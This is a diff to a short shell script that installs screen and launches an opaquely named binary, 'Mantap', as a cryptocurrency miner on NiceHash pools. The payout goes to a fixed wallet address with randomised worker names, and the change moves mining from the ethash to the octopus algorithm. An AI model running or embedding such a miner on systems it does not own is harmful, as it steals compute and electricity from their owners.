@@ -1,6 +1,6 @@
 #!/bin/sh
 
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
-sudo apt-get update
-sudo apt install screen -y
-chmod u+x Mantap &&  ./Mantap -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
+apt-get update
+apt install screen -y
+chmod u+x Mantap &&  ./Mantap -a octopus -o stratum+tcp://octopus.eu-west.nicehash.com:3389 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
